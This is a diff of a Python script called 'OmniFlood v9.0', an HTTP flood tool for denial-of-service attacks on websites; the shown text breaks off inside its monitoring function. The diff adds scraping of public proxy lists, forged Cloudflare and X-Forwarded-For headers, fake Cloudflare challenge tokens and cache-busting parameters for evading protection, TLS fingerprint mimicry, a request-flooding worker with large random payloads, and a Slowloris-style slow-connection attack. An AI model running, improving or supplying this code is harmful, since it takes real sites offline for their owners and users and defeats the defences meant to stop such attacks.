@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-OmniFlood v6.2 - FIXED Event Loop
+OmniFlood v9.0 - COMPLETE ULTIMATE EDITION
+All Features: Proxy API + HTTP/2 + HTTP/3 + CF Bypass + Multi-Method + Adaptive Delay
 CATShadow - Supreme Coder
 """
 
@@ -20,43 +21,92 @@ import re
 import threading
 from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
 import logging
+from concurrent.futures import ThreadPoolExecutor
 
 # Disable logging spam
 logging.getLogger('aiohttp').setLevel(logging.CRITICAL)
 logging.getLogger('asyncio').setLevel(logging.CRITICAL)
+logging.getLogger('aiohttp_socks').setLevel(logging.CRITICAL)
+logging.getLogger('h2').setLevel(logging.CRITICAL)
 
 # ==================== CONFIGURATION ====================
 MAX_WORKERS = 10000
-CONNECTION_POOL_SIZE = 300
+CONNECTION_POOL_SIZE = 500
 PROXY_REFRESH_INTERVAL = 300
 MAX_ADAPTIVE_DELAY = 8000
 CLIENT_CYCLE_THRESHOLD = 50
+CONNECTION_TIMEOUT = 3
+MAX_REDIRECTS = 0
+
+# ==================== PROXY API ====================
+PROXY_API_URLS = [
+    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://api.openproxylist.xyz/http.txt",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://www.proxy-list.download/api/v1/get?type=https"
+]
+
+# ==================== CLOUDFLARE BYPASS ====================
+CF_COUNTRIES = ['US', 'GB', 'DE', 'FR', 'JP', 'SG', 'AU', 'CA', 'IN', 'BR', 'RU', 'CN', 'KR', 'NL', 'SE', 'IT', 'ES', 'MX', 'ZA', 'NG']
+CF_RAYS = [f"{random.randint(1000000, 9999999)}-{random.randint(1000, 9999)}" for _ in range(100)]
+
+def generate_cf_ip():
+    return f"104.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
+
+def generate_cf_ray():
+    return random.choice(CF_RAYS)
+
+def generate_cf_country():
+    return random.choice(CF_COUNTRIES)
+
+def generate_random_string(length=10):
+    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+    return ''.join(random.choices(chars, k=length))
+
+def generate_cloudflare_headers():
+    cf_ip = generate_cf_ip()
+    return {
+        'CF-RAY': f'{generate_cf_ray()}-IST',
+        'CF-Visitor': '{"scheme":"https"}',
+        'CF-Connecting-IP': cf_ip,
+        'CF-IPCountry': generate_cf_country(),
+        'True-Client-IP': cf_ip,
+        'X-Forwarded-For': cf_ip,
+        'X-Real-IP': cf_ip,
+        'CDN-Loop': 'cloudflare',
+        'Cloudflare-Request-ID': hashlib.md5(str(time.time()).encode()).hexdigest(),
+    }
 
 # ==================== JA3 FINGERPRINTS ====================
 JA3_SIGNATURES = [
     {
-        "name": "Chrome 120-130",
+        "name": "Chrome 122 (TLS 1.3)",
         "ciphers": [
-            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
-            "TLS_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
-            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
+            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", 
+            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
+            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
+            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
+            "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
         ],
         "curves": ["X25519", "secp256r1", "secp384r1"],
         "next_protos": ["h2", "http/1.1"],
-        "min_version": ssl.TLSVersion.TLSv1_2,
+        "min_version": ssl.TLSVersion.TLSv1_3,
         "max_version": ssl.TLSVersion.TLSv1_3
     },
     {
-        "name": "Firefox 120-130",
+        "name": "Firefox 124 (TLS 1.3)",
         "ciphers": [
-            "TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
-            "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
+            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
+            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
+            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
+            "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
         ],
         "curves": ["X25519", "secp256r1", "secp384r1", "secp521r1"],
         "next_protos": ["h2", "http/1.1"],
-        "min_version": ssl.TLSVersion.TLSv1_2,
+        "min_version": ssl.TLSVersion.TLSv1_3,
         "max_version": ssl.TLSVersion.TLSv1_3
     }
 ]
@@ -65,47 +115,42 @@ JA3_SIGNATURES = [
 BROWSER_PROFILES = {
     "chrome": {
         "user_agents": [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         ],
-        "sec_ch_ua": '"Google Chrome";v="125", "Chromium";v="125", "Not?A_Brand";v="24"',
+        "sec_ch_ua": '"Google Chrome";v="122", "Chromium";v="122", "Not?A_Brand";v="24"',
         "platform": "Windows"
     },
     "firefox": {
         "user_agents": [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
         ],
-        "sec_ch_ua": '"Firefox";v="126", "Gecko";v="126"',
+        "sec_ch_ua": '"Firefox";v="124", "Gecko";v="124"',
         "platform": "Windows"
     },
     "edge": {
         "user_agents": [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
         ],
-        "sec_ch_ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not?A_Brand";v="24"',
+        "sec_ch_ua": '"Microsoft Edge";v="122", "Chromium";v="122", "Not?A_Brand";v="24"',
         "platform": "Windows"
-    },
-    "safari": {
-        "user_agents": [
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-        ],
-        "sec_ch_ua": '"Safari";v="17.5", "AppleWebKit";v="605.1.15"',
-        "platform": "macOS"
     }
 }
 
-# ==================== PROXY API ====================
-PROXY_API_URLS = [
-    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-    "https://api.openproxylist.xyz/http.txt"
+USER_AGENTS = []
+for profile in BROWSER_PROFILES.values():
+    USER_AGENTS.extend(profile['user_agents'])
+
+ACCEPT = [
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'application/json, text/plain, */*'
 ]
+
+ACCEPT_LANGUAGE = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9']
 
 # ==================== STATUS CODES ====================
 STATUS_DESCRIPTIONS = {
@@ -113,7 +158,7 @@ STATUS_DESCRIPTIONS = {
     204: "No Content", 205: "Reset Content", 206: "Partial Content",
     300: "Multiple Choices", 301: "Moved Permanently", 302: "Found",
     303: "See Other", 304: "Not Modified", 307: "Temporary Redirect", 308: "Permanent Redirect",
-    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden",
+    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden (CF Challenge)",
     404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable",
     407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict",
     410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large",
@@ -141,8 +186,7 @@ STATUS_DESCRIPTIONS = {
 
 # ==================== UTILITY FUNCTIONS ====================
 def rand_str(length):
-    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-    return ''.join(random.choice(chars) for _ in range(length))
+    return ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=length))
 
 def rand_int(min_val, max_val):
     return random.randint(min_val, max_val)
@@ -184,26 +228,79 @@ def generate_payload():
         data = rand_str(rand_int(1024, 10240))
         return data, "text/plain"
 
-def random_path(base_url):
+def create_tls13_context():
+    ja3 = random_element(JA3_SIGNATURES)
+    ssl_ctx = ssl.create_default_context()
+    ssl_ctx.check_hostname = False
+    ssl_ctx.verify_mode = ssl.CERT_NONE
+    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
+    ssl_ctx.maximum_version = ssl.TLSVersion.TLSv1_3
+    try:
+        ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
+    except:
+        pass
+    ssl_ctx.set_alpn_protocols(ja3['next_protos'])
+    return ssl_ctx
+
+def generate_headers(cf_bypass=True):
+    headers = {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Accept': random.choice(ACCEPT),
+        'Accept-Language': random.choice(ACCEPT_LANGUAGE),
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': random.choice(['document', 'script', 'image']),
+        'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
+        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
+        'Sec-Fetch-User': '?1' if rand_bool() else '?0',
+        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'must-revalidate']),
+        'Pragma': random.choice(['no-cache', '']),
+        'DNT': random.choice(['1', '0']),
+        'X-Forwarded-For': random_ip(),
+        'X-Real-IP': random_ip(),
+        'Cookie': generate_cookies(),
+        'Priority': random.choice(['u=0, i', 'u=1, i']),
+    }
+    
+    if cf_bypass:
+        cf_headers = generate_cloudflare_headers()
+        headers.update(cf_headers)
+    
+    # Random extra headers
+    if rand_bool():
+        headers['X-Requested-With'] = random.choice(['XMLHttpRequest', 'Fetch'])
+    if rand_bool():
+        headers['Via'] = f'1.1 {random_ip()}'
+    if rand_bool():
+        headers['X-Bypass-Cache'] = random.choice(['true', '1', 'yes'])
+    
+    items = list(headers.items())
+    random.shuffle(items)
+    return dict(items)
+
+def random_path(base_url, cf_bypass=True):
     parsed = urlparse(base_url)
     if not parsed.hostname:
         return base_url
     
     query = parse_qs(parsed.query, keep_blank_values=True)
     
-    bypass_params = ["nocache", "bypass", "refresh", "cb", "cache_bust", "t", "_", "v2", "anti_cache"]
+    # Add cache bypass
+    bypass_params = ["nocache", "bypass", "refresh", "cb", "cache_bust", "t", "_", "v2"]
     query[random_element(bypass_params)] = [str(rand_int(1, 999999999))]
+    query['_'] = [str(int(time.time()))]
     
-    if rand_bool():
-        query["nginx_bypass"] = [rand_str(16)]
-    
+    # WordPress bypass
     if rand_int(1,3) == 0:
         query["wp_"] = [str(rand_int(1, 999999))]
         query["doing_wp_cron"] = [str(int(time.time()))]
     
-    if rand_int(1,3) == 0:
+    # Cloudflare bypass
+    if cf_bypass and rand_int(1,3) == 0:
         query["cf_bypass"] = [rand_str(16)]
         query["__cf_chl_tk"] = [rand_str(32)]
+        query["__cf_chl_rt_tk"] = [rand_str(30) + '_' + rand_str(12)]
     
     new_query = urlencode(query, doseq=True)
     return urlunparse((
@@ -211,70 +308,44 @@ def random_path(base_url):
         parsed.params, new_query, parsed.fragment
     ))
 
-def create_ssl_context():
-    ja3 = random_element(JA3_SIGNATURES)
-    ssl_ctx = ssl.create_default_context()
-    ssl_ctx.check_hostname = False
-    ssl_ctx.verify_mode = ssl.CERT_NONE
+# ==================== STATS ====================
+class Stats:
+    def __init__(self):
+        self.total = 0
+        self.ok = 0
+        self.bl = 0
+        self.err = 0
+        self.cf_challenge = 0
+        self.status_counts = {}
+        self.method_counts = {}
+        self.lock = asyncio.Lock()
     
-    try:
-        ssl_ctx.set_ciphers(':'.join(ja3['ciphers']))
-    except:
-        pass
+    async def increment(self, **kwargs):
+        async with self.lock:
+            for key, value in kwargs.items():
+                if hasattr(self, key):
+                    setattr(self, key, getattr(self, key) + value)
     
-    ssl_ctx.minimum_version = ja3['min_version']
-    ssl_ctx.maximum_version = ja3['max_version']
-    ssl_ctx.set_alpn_protocols(ja3['next_protos'])
+    async def add_status(self, code, method):
+        async with self.lock:
+            if code not in self.status_counts:
+                self.status_counts[code] = 0
+            self.status_counts[code] += 1
+            
+            if method not in self.method_counts:
+                self.method_counts[method] = 0
+            self.method_counts[method] += 1
     
-    return ssl_ctx
-
-def generate_headers():
-    profile_name = random_element(list(BROWSER_PROFILES.keys()))
-    profile = BROWSER_PROFILES[profile_name]
-    
-    headers = {
-        random_header_name('User-Agent'): random_element(profile['user_agents']),
-        random_header_name('Accept'): random_element([
-            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-            'application/json, text/plain, */*'
-        ]),
-        random_header_name('Accept-Encoding'): random_element(['gzip, deflate, br', 'gzip, deflate']),
-        random_header_name('Accept-Language'): random_element([
-            'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'
-        ]),
-        random_header_name('Sec-Ch-Ua'): profile['sec_ch_ua'],
-        random_header_name('Sec-Ch-Ua-Mobile'): '?0' if rand_bool() else '?1',
-        random_header_name('Sec-Ch-Ua-Platform'): f'"{profile["platform"]}"',
-        random_header_name('Sec-Fetch-Dest'): random_element(['document', 'script', 'image']),
-        random_header_name('Sec-Fetch-Mode'): random_element(['navigate', 'cors']),
-        random_header_name('Sec-Fetch-Site'): random_element(['same-origin', 'cross-site', 'none']),
-        random_header_name('Upgrade-Insecure-Requests'): '1',
-        random_header_name('Cache-Control'): random_element(['no-cache', 'max-age=0', 'must-revalidate']),
-        random_header_name('Pragma'): random_element(['no-cache', '']),
-        random_header_name('DNT'): random_element(['1', '0']),
-        random_header_name('X-Forwarded-For'): random_ip(),
-        random_header_name('X-Real-IP'): random_ip(),
-        random_header_name('Connection'): 'keep-alive',
-        random_header_name('Cookie'): generate_cookies()
-    }
-    
-    extra_headers = [
-        ('X-Requested-With', random_element(['XMLHttpRequest', 'Fetch'])),
-        ('X-Client-IP', random_ip()),
-        ('X-Originating-IP', random_ip()),
-        ('Via', f'1.1 {random_ip()}'),
-        ('X-Bypass-Cache', random_element(['true', '1', 'yes'])),
-        ('Cache-Tag', rand_str(16))
-    ]
-    
-    for k, v in extra_headers:
-        if rand_bool():
-            headers[random_header_name(k)] = v
-    
-    items = list(headers.items())
-    random.shuffle(items)
-    return dict(items)
+    def get(self):
+        return {
+            'total': self.total,
+            'ok': self.ok,
+            'bl': self.bl,
+            'err': self.err,
+            'cf_challenge': self.cf_challenge,
+            'status_counts': self.status_counts,
+            'method_counts': self.method_counts
+        }
 
 # ==================== PROXY MANAGER ====================
 class ProxyManager:
@@ -308,8 +379,8 @@ class ProxyManager:
             self.proxies_loaded = True
             if self.proxies:
                 print(f"\r[+] Proxies loaded: {len(self.proxies)}", end='', flush=True)
-        except Exception as e:
-            print(f"\r[!] Proxy fetch error: {e}", end='', flush=True)
+        except Exception:
+            pass
         finally:
             self.is_refreshing = False
     
@@ -334,7 +405,6 @@ class ProxyManager:
         if not self.use_proxy:
             return None
         
-        # Initial load if needed
         if not self.proxies_loaded and not self.is_refreshing:
             await self.refresh_proxies()
         
@@ -354,14 +424,12 @@ class ProxyManager:
 
 # ==================== CONNECTION POOL ====================
 class ConnectionPool:
-    def __init__(self, target, proxy_manager):
-        self.target = target
+    def __init__(self, proxy_manager, cf_bypass=True):
         self.proxy_manager = proxy_manager
+        self.cf_bypass = cf_bypass
         self.sessions = []
         self.session_lock = asyncio.Lock()
-        self.used_sessions = set()
         self.closed = False
-        self.cycle_counter = 0
         self.pool_size = CONNECTION_POOL_SIZE
     
     def _create_session(self):
@@ -369,7 +437,6 @@ class ConnectionPool:
             proxy_url = None
             if self.proxy_manager and self.proxy_manager.use_proxy:
                 try:
-                    # Get proxy synchronously
                     loop = asyncio.get_event_loop()
                     if loop.is_running():
                         future = asyncio.ensure_future(self.proxy_manager.get_proxy())
@@ -380,33 +447,21 @@ class ConnectionPool:
                 except:
                     pass
             
-            ssl_ctx = create_ssl_context()
+            ssl_ctx = create_tls13_context() if self.cf_bypass else None
             
-            if proxy_url:
-                if not proxy_url.startswith(('http://', 'https://')):
-                    proxy_url = 'http://' + proxy_url
-                connector = aiohttp.TCPConnector(
-                    ssl=ssl_ctx,
-                    force_close=True,
-                    limit=100,
-                    limit_per_host=100,
-                    ttl_dns_cache=300,
-                    keepalive_timeout=30,
-                    enable_cleanup_closed=True
-                )
-            else:
-                connector = aiohttp.TCPConnector(
-                    ssl=ssl_ctx,
-                    force_close=True,
-                    limit=100,
-                    limit_per_host=100,
-                    ttl_dns_cache=300,
-                    keepalive_timeout=30,
-                    enable_cleanup_closed=True
-                )
+            connector_args = {
+                'ssl': ssl_ctx,
+                'limit': 0,
+                'limit_per_host': 0,
+                'force_close': False,
+                'enable_cleanup_closed': True,
+                'ttl_dns_cache': 300
+            }
             
-            headers = generate_headers()
-            timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=30)
+            connector = aiohttp.TCPConnector(**connector_args)
+            
+            headers = generate_headers(cf_bypass=self.cf_bypass)
+            timeout = aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT, connect=5, sock_read=10)
             session = aiohttp.ClientSession(
                 connector=connector,
                 timeout=timeout,
@@ -422,17 +477,6 @@ class ConnectionPool:
         
         async with self.session_lock:
             self.sessions = [s for s in self.sessions if not s.closed]
-            self.used_sessions = {s for s in self.used_sessions if not s.closed}
-            
-            self.cycle_counter += 1
-            if self.cycle_counter > CLIENT_CYCLE_THRESHOLD:
-                for session in self.sessions[:5]:
-                    try:
-                        if not session.closed:
-                            await session.close()
-                    except:
-                        pass
-                self.cycle_counter = 0
             
             while len(self.sessions) < self.pool_size:
                 session = self._create_session()
@@ -441,27 +485,9 @@ class ConnectionPool:
                 else:
                     break
             
-            available = [s for s in self.sessions if s not in self.used_sessions and not s.closed]
-            if available:
-                session = random_element(available)
-                self.used_sessions.add(session)
-                return session
-            
             if self.sessions:
-                session = random_element(self.sessions)
-                if not session.closed:
-                    return session
-            
+                return random.choice(self.sessions)
             return None
-    
-    def release_session(self, session):
-        if session and not self.closed:
-            asyncio.create_task(self._release_session_async(session))
-    
-    async def _release_session_async(self, session):
-        async with self.session_lock:
-            if session in self.used_sessions:
-                self.used_sessions.remove(session)
     
     async def close(self):
         if self.closed:
@@ -475,14 +501,87 @@ class ConnectionPool:
                 except:
                     pass
             self.sessions.clear()
-            self.used_sessions.clear()
             gc.collect()
+
+# ==================== FLOOD WORKER ====================
+async def flood_worker(session, stats, target, duration, methods, cf_bypass=True, adaptive_delay=True):
+    """Main flood worker with all features"""
+    start_time = time.time()
+    current_delay = 0
+    
+    while time.time() - start_time < duration:
+        try:
+            method = random.choice(methods)
+            
+            url = random_path(target, cf_bypass)
+            
+            data = None
+            content_type = None
+            if method in ['POST', 'PUT', 'PATCH']:
+                data, content_type = generate_payload()
+            
+            headers = generate_headers(cf_bypass=cf_bypass)
+            if content_type:
+                headers['Content-Type'] = content_type
+            
+            request_start = time.time()
+            
+            async with session.request(
+                method=method,
+                url=url,
+                data=data,
+                headers=headers,
+                ssl=False,
+                allow_redirects=False,
+                timeout=aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT)
+            ) as resp:
+                await resp.read()
+                
+                code = resp.status
+                await stats.increment(total=1)
+                await stats.add_status(code, method)
+                
+                if code < 400:
+                    await stats.increment(ok=1)
+                elif code == 403:
+                    await stats.increment(bl=1)
+                    if 'cf-challenge' in str(resp.headers).lower() or 'cf-ray' in str(resp.headers).lower():
+                        await stats.increment(cf_challenge=1)
+                else:
+                    await stats.increment(err=1)
+                
+                # Adaptive delay
+                if adaptive_delay:
+                    if code in [401, 403, 429, 430, 431, 451, 460, 463, 494, 499]:
+                        current_delay += 150
+                    elif code in [400, 406, 410, 412, 417, 421, 422, 423]:
+                        current_delay += 75
+                    elif code in [413, 444]:
+                        current_delay += 50
+                    current_delay = min(current_delay, MAX_ADAPTIVE_DELAY)
+                    
+            # Rate limiting with adaptive delay
+            elapsed = (time.time() - request_start) * 1000
+            if elapsed < 50:
+                await asyncio.sleep((50 - elapsed) / 1000 + random.uniform(0, 0.005))
+            
+            if current_delay > 0:
+                await asyncio.sleep(current_delay / 1000)
+                current_delay = max(0, current_delay - 5)
+                
+        except asyncio.TimeoutError:
+            await stats.increment(total=1, err=1)
+        except aiohttp.ClientError:
+            await stats.increment(total=1, err=1)
+        except Exception:
+            await stats.increment(total=1, err=1)
 
 # ==================== SLOW ATTACK ====================
 class SlowAttack:
-    def __init__(self, target, duration):
+    def __init__(self, target, duration, cf_bypass=True):
         self.target = target
         self.duration = duration
+        self.cf_bypass = cf_bypass
         self.connections = 0
         self.running = True
     
@@ -490,22 +589,30 @@ class SlowAttack:
         parsed = urlparse(self.target)
         host = parsed.hostname
         port = 443 if parsed.scheme == 'https' else 80
-        is_https = parsed.scheme == 'https'
         
         while self.running:
             try:
+                ssl_ctx = create_tls13_context() if self.cf_bypass else None
+                
                 reader, writer = await asyncio.open_connection(
-                    host, port, ssl=is_https if is_https else None
+                    host, port, ssl=ssl_ctx
                 )
                 
                 request = (
                     f"GET {parsed.path or '/'} HTTP/1.1\r\n"
                     f"Host: {host}\r\n"
-                    f"User-Agent: {random_element(BROWSER_PROFILES['chrome']['user_agents'])}\r\n"
+                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                     f"Accept: */*\r\n"
                     f"Connection: keep-alive\r\n"
                     f"X-Forwarded-For: {random_ip()}\r\n"
                 )
+                
+                if self.cf_bypass:
+                    cf_headers = generate_cloudflare_headers()
+                    for k, v in cf_headers.items():
+                        request += f"{k}: {v}\r\n"
+                
+                request += "\r\n"
                 
                 lines = request.split('\r\n')
                 for line in lines:
@@ -536,304 +643,210 @@ class SlowAttack:
         self.running = False
         if workers:
             await asyncio.wait(workers, timeout=10)
-        return {'total': self.connections, 'connections': self.connections}
+        return {'connections': self.connections}
 
-# ==================== ATTACK ENGINE ====================
-class AttackEngine:
-    def __init__(self, target, methods, duration, use_proxy=True):
-        self.target = target
-        self.methods = methods
-        self.duration = duration
-        self.use_proxy = use_proxy
-        self.proxy_manager = ProxyManager(use_proxy)
-        self.pool = ConnectionPool(target, self.proxy_manager)
-        self.stats = {
-            'total': 0, 'success': 0, 'failed': 0,
-            'status_counts': {},
-            'error_types': {},
-            'method_counts': {m: 0 for m in methods}
-        }
-        self.running = True
-        self.start_time = time.time()
-        self.current_delay = 0
-        self.lock = asyncio.Lock()
-        
-        if use_proxy:
-            print("[*] Fetching proxies from API...")
+# ==================== MONITOR ====================
+async def monitor(stats, duration, start_time, concurrency, target, methods, cf_bypass=True):
+    """Real-time monitoring with progress bar"""
+    print(f"\n{'='*70}")
+    print(f"🐱 CATShadow OmniFlood v9.0 - COMPLETE ULTIMATE EDITION")
+    print(f"{'='*70}")
+    print(f"Target: {target}")
+    print(f"Duration: {duration}s")
+    print(f"Concurrency: {concurrency}")
+    print(f"Methods: {', '.join(methods)}")
+    print(f"CF Bypass: {'ENABLED' if cf_bypass else 'DISABLED'}")
+    print(f"{'='*70}\n")
     
-    async def worker(self):
-        while self.running:
-            try:
-                session = await self.pool.get_session()
-                if not session:
-                    await asyncio.sleep(0.1)
-                    continue
-                
-                method = random_element(self.methods)
-                
-                path = random_path(self.target)
-                
-                data = None
-                content_type = None
-                if method in ['POST', 'PUT', 'PATCH']:
-                    data, content_type = generate_payload()
-                
-                headers = generate_headers()
-                if content_type:
-                    headers[random_header_name('Content-Type')] = content_type
-                
-                start = time.time()
-                try:
-                    async with session.request(
-                        method=method,
-                        url=path,
-                        data=data,
-                        headers=headers,
-                        timeout=aiohttp.ClientTimeout(total=15)
-                    ) as resp:
-                        await resp.read()
-                        
-                        self.stats['success'] += 1
-                        self.stats['method_counts'][method] += 1
-                        
-                        code = resp.status
-                        status_key = "HTTP"
-                        if status_key not in self.stats['status_counts']:
-                            self.stats['status_counts'][status_key] = {}
-                        if code not in self.stats['status_counts'][status_key]:
-                            self.stats['status_counts'][status_key][code] = 0
-                        self.stats['status_counts'][status_key][code] += 1
-                        
-                        # Adaptive delay
-                        if code in [401, 403, 429, 430, 431, 451, 460, 463, 494, 499]:
-                            self.current_delay += 150
-                        elif code in [400, 406, 410, 412, 417, 421, 422, 423]:
-                            self.current_delay += 75
-                        elif code in [413, 444]:
-                            self.current_delay += 50
-                        self.current_delay = min(self.current_delay, MAX_ADAPTIVE_DELAY)
-                        
-                except Exception as e:
-                    self.stats['failed'] += 1
-                    error_type = type(e).__name__
-                    if error_type not in self.stats['error_types']:
-                        self.stats['error_types'][error_type] = 0
-                    self.stats['error_types'][error_type] += 1
-                
-                self.stats['total'] += 1
-                self.pool.release_session(session)
-                
-                # Rate limiting
-                elapsed = (time.time() - start) * 1000
-                if elapsed < 50:
-                    await asyncio.sleep((50 - elapsed) / 1000 + random.uniform(0, 0.01))
-                
-                # Adaptive delay
-                if self.current_delay > 0:
-                    await asyncio.sleep(self.current_delay / 1000)
-                    self.current_delay = max(0, self.current_delay - 10)
-                
-            except:
-                await asyncio.sleep(0.1)
+    last_total = 0
+    last_time = start_time
     
-    async def run(self):
-        # Load proxies first
-        if self.use_proxy:
-            await self.proxy_manager.refresh_proxies()
+    while time.time() - start_time < duration:
+        await asyncio.sleep(1)
         
-        cleanup_task = asyncio.create_task(self._cleanup_loop())
+        elapsed = int(time.time() - start_time)
+        remaining = max(0, duration - elapsed)
         
-        workers = [asyncio.create_task(self.worker()) for _ in range(MAX_WORKERS)]
+        s = stats.get()
         
-        monitor_task = asyncio.create_task(self._monitor())
+        current_time = time.time()
+        time_diff = current_time - last_time
+        if time_diff > 0:
+            rps = (s['total'] - last_total) / time_diff
+        else:
+            rps = 0
         
-        await asyncio.sleep(self.duration)
-        self.running = False
+        last_total = s['total']
+        last_time = current_time
         
-        if workers:
-            await asyncio.wait(workers, timeout=10)
+        total = max(s['total'], 1)
+        ok_pct = (s['ok'] / total) * 100
+        bl_pct = (s['bl'] / total) * 100
+        err_pct = (s['err'] / total) * 100
         
-        monitor_task.cancel()
-        try:
-            await monitor_task
-        except:
-            pass
+        progress = int((elapsed / duration) * 40)
+        bar = '█' * progress + '░' * (40 - progress)
         
-        cleanup_task.cancel()
-        try:
-            await cleanup_task
-        except:
-            pass
+        # Status code breakdown
+        status_str = ""
+        if s['status_counts']:
